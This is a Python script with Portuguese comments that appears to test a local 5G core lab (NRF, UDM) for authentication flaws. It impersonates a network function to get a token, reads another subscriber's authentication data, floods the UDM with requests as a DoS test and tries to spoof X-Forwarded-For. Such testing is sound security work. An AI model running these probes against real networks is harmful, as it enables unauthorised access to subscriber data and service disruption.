import requests
import urllib3
import json
import socket
import time

#--- Configurações de Ambiente ---
NF_CONFIG = {
    "NRF_IP": "127.0.0.10",
    "NRF_PORT": 8000,
    "UDM_IP": "127.0.0.3",
    "UDM_PORT": 8000,
    "SUPI_1": "208930000000001",
    "SUPI_2": "208930000000002"
}

UDM_API_URL_BASE = f"http://{NF_CONFIG['UDM_IP']}:{NF_CONFIG['UDM_PORT']}/nudm-uecm/v1/ues"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_access_token():
    """Tenta obter um token de acesso de uma NF."""
    auth_url = f"http://{NF_CONFIG['NRF_IP']}:{NF_CONFIG['NRF_PORT']}/nnrf-nfm/v1/oauth2/token"
    auth_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    auth_data = "grant_type=client_credentials&client_id=NSSF"
    try:
        response = requests.post(auth_url, headers=auth_headers, data=auth_data, timeout=5)
        response.raise_for_status()
        return response.json().get("access_token")
    except (requests.exceptions.RequestException, KeyError) as e:
        print(f"[-] Erro ao obter token de acesso: {e}")
        return None

def test_authentication_failures():
    print("=" * 50)
    print("A7: Testando Falhas de Identificação e Autenticação")
    print("=" * 50)
    
    #--- Teste 1: Bypass de Autenticação (BOLA) ---
    print("\n[+] Testando Bypass de Autenticação...")
    token = get_access_token()
    if not token:
        print("[-] Não foi possível obter o token, o teste não pode continuar.")
        return

    headers = {"Authorization": f"Bearer {token}"}
    other_supi_url = f"{UDM_API_URL_BASE}/imsi-{NF_CONFIG['SUPI_2']}/authentications"

    try:
        response = requests.get(other_supi_url, headers=headers, timeout=5)
        if response.status_code in [200, 201]:
            print("[!!!] VULNERABILIDADE DETECTADA: Broken Object Level Authorization!")
            print("      O token de uma NF pode acessar dados de outro SUPI.")
        elif response.status_code in [401, 403]:
            print("[+] Acesso negado. A API está protegida corretamente.")
        else:
            print(f"[-] Resposta inesperada. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao se conectar à API para teste de autenticação: {e}")

    #--- Teste 2: Negação de Serviço (DoS) ---
    print("\n[+] Testando Negação de Serviço (DoS) no UDM...")

    try:
        for _ in range(500):
            requests.get(UDM_API_URL_BASE, timeout=0.1)
        print("[+] Teste de estresse concluído. Verifique manualmente o desempenho da NF.")
    except requests.exceptions.RequestException as e:
        print(f"[!!!] Possível vulnerabilidade de DoS: a NF parou de responder durante o teste de estresse: {e}")

    #--- Teste 3: Spoofing de IP (Conceitual) ---
    print("\n[+] Testando Spoofing de IP (Conceitual) na API do UDM...")
    try:
        spoofed_headers = {"X-Forwarded-For": "172.16.0.118", "Authorization": f"Bearer {token}"}
        response = requests.get(other_supi_url, headers=spoofed_headers, timeout=5)
        
        if response.status_code in [200, 201]:
            print("[!!!] VULNERABILIDADE DETECTADA: O servidor confiou em um cabeçalho spoofed e permitiu o acesso.")
        else:
            print("[+] O servidor não confiou no cabeçalho X-Forwarded-For. Teste de spoofing concluído.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao tentar o spoofing: {e}")

if __name__ == "__main__":
    test_authentication_failures()